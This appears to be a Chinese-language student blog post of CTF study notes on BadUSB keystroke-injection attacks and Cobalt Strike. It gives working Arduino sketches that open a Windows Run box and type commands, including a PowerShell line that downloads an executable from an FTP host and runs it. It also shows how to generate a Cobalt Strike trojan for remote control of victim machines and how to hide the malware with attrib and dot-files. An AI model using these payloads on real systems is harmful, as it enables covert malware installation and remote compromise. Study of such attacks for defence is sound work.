---
title: CTF学习笔记（大学篇）02 —— BadUSB & CobaltStrike
date: 2022-04-16 08:22:03
tags: CTF
categories: CTF
---

### HID设备

人类接口设备，就是直接与人类进行交互的设备（鼠标、键盘之类的）

### HID攻击

插入一定的设备，设备有一定的标识符（例如Keyboard、Mouse），插入后就可以运行烧录在BadUSB上的指令来输入恶意代码，把木马植入计算机之中。（伪造用户击键行为等）

### USB HID攻击 VS 摆渡攻击

前者运用的是伪造的HID设备执行恶意代码，摆渡攻击是在U盘等设备放置木马程序，隐藏在存储介质之中。

### USB HID攻击特点

- 隐蔽性强
- 攻击范围广
- 权限高

攻击范围是只要能够支持USB HID接口协议的设备均可用。

### 相关编程语句

#### 默认内容

```C++
void setup() {

}

void loop() {

}
```

- `void setup()`函数内的代码只运行一次
- `void loop()`函数内的代码会一直循环运行

#### 运行cmd并打开记事本，输入相关内容

```c++
#include<Keyboard.h>
void setup() {
  // put your setup code here, to run once:
Keyboard.begin();
delay(1000);

Keyboard.press(KEY_LEFT_GUI);//win键
delay(500);
Keyboard.press('r');//r键
delay(500);
Keyboard.release(KEY_LEFT_GUI);//win键释放
Keyboard.release('r');//r键释放

Keyboard.press(KEY_CAPS_LOCK);//若目标机开启大小写，关掉即可
Keyboard.release(KEY_CAPS_LOCK);//若目标机没有开启，也不影响
delay(500);
Keyboard.println("cmd");
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);//目标机开启中文或开启大小写键
delay(500);

//弹出记事本
Keyboard.println("notepad.exe");
delay(500);
delay(500);//可防止丢帧
Keyboard.println("you are hacked!!!");
Keyboard.println("you are hacked!!!");
Keyboard.println("you are hacked!!!");
Keyboard.press(KEY_CAPS_LOCK);//若目标机开启大小写，关掉即可
Keyboard.release(KEY_CAPS_LOCK);
Keyboard.end();//结束键盘通讯
}

void loop() {
  // put your main code here, to run repeatedly:
}
```

- `Keyboard.press`就表示按下按键，用`Keyboard.release`松开
- `KEY_LEFT_GUI`表示左边的Win按键
- `Keyboard.begin()`开启键盘通讯，`Keyboard.end()`来表示结束
- 因为插入设备的时候目标主机可能处于中文输入法，所以用`Keyboard.press(KEY_CAPS_LOCK)`打开大小写锁定，然后来输入命令，这样输入的就是英文字符而不受到中文输入法的限制了，输入完了以后记得用`Keyboard.release(KEY_CAPS_LOCK)`松开
- `Keyboard.begin()`下面的`delay(1000)`：一般来说，设备插入后计算机需要启动驱动，在这里加入延迟就是为了给计算机启动驱动的时间（甚至是安装驱动，diss一下win7以下的那堆），当然一般是3秒5秒，1秒还是太短了
- 按键的定义如下（键盘按键+编码）

```c++
///Alt和Ctrl和Shift
#define KEY_LEFT_CTRL   0x80
#define KEY_LEFT_SHIFT    0x81
#define KEY_LEFT_ALT    0x82
#define KEY_LEFT_GUI    0x83
#define KEY_RIGHT_CTRL    0x84
#define KEY_RIGHT_SHIFT   0x85
#define KEY_RIGHT_ALT   0x86
#define KEY_RIGHT_GUI   0x87
///方向键系列
#define KEY_UP_ARROW    0xDA
#define KEY_DOWN_ARROW    0xD9
#define KEY_LEFT_ARROW    0xD8
#define KEY_RIGHT_ARROW   0xD7
//特殊键位，其中RETURN就是回车
#define KEY_BACKSPACE   0xB2
#define KEY_TAB       0xB3
#define KEY_RETURN      0xB0
#define KEY_ESC       0xB1
///特殊键位，我比较常用的是DELETE
#define KEY_INSERT      0xD1
#define KEY_DELETE      0xD4
#define KEY_PAGE_UP     0xD3
#define KEY_PAGE_DOWN   0xD6
#define KEY_HOME      0xD2
#define KEY_END       0xD5
#define KEY_CAPS_LOCK   0xC1
///F区的这些那些
#define KEY_F1        0xC2
#define KEY_F2        0xC3
#define KEY_F3        0xC4
#define KEY_F4        0xC5
#define KEY_F5        0xC6
#define KEY_F6        0xC7
#define KEY_F7        0xC8
#define KEY_F8        0xC9
#define KEY_F9        0xCA
#define KEY_F10       0xCB
#define KEY_F11       0xCC
#define KEY_F12       0xCD
#define KEY_F13       0xF0
#define KEY_F14       0xF1
#define KEY_F15       0xF2
#define KEY_F16       0xF3
#define KEY_F17       0xF4
#define KEY_F18       0xF5
#define KEY_F19       0xF6
#define KEY_F20       0xF7
#define KEY_F21       0xF8
#define KEY_F22       0xF9
#define KEY_F23       0xFA
#define KEY_F24       0xFB
```

#### 利用FTP服务器存储病毒文件，利用BadUSB执行下载命令后运行

```C++
#include "Keyboard.h"

void setup() 
{
  Keyboard.begin();
  delay(2000);
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI); //win键 释放
  Keyboard.release('r'); //r键 释放
  delay(500);
  Keyboard.println("powershell $p=new-object system.net.webclient;$p.downloadfile('FTP://admin:123456@169.254.202.247/calc.exe','F:\\calc.exe');START F:\\calc.exe");
  Keyboard.end();//结束键盘通讯 
}

void loop() 
{
}

```

- FTP协议写法：`ftp://<username>:<password>@<address>:<port>`，可以通过这种方式将用户名和命令写入而无需弹出验证窗口

### CobaltStrike用法

首先需要打开Teamserver

![](https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/%E7%AE%A1%E7%90%86%E5%91%98__%E8%8E%B7%E5%8F%96%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%20-%2020220416-164025.png)

然后再打开CS，连接Teamserver

![](https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/Connect%20-%2020220416-164031.png)

接着就会弹出主界面

![](https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/Cobalt_Strike%20-%2020220416-164039.png)

然后我们生成一个木马程序，这个程序运行后就会在主界面显示肉鸡，可以进行远程操作等操作

![](https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/Windows_Executable%20-%2020220416-164049.png)

![](https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-2/Choose_a_payload_to_stage%20-%2020220416-164045.png)

### 隐藏木马病毒

一般来说，木马下载到计算机内后，如果不隐藏很快就会被发现（这不是当然的嘛，一个不明觉厉的exe在那里谁都会感觉奇怪吧）

所以在Windows下，我们可以将文件进行隐藏，使用`attrib`命令就可以做到这一点，例如

```powershell
attrib +s +h '.\Virus.exe'
```

隐藏后可以用命令行打开（直接输入`.\Virus.exe`就行了），但是在文件资源管理器里面看不到

在Linux下，可以在文件的最前面加一个点（`.`），会被Linux认为是隐藏文件，就在文件管理器中看不到啦
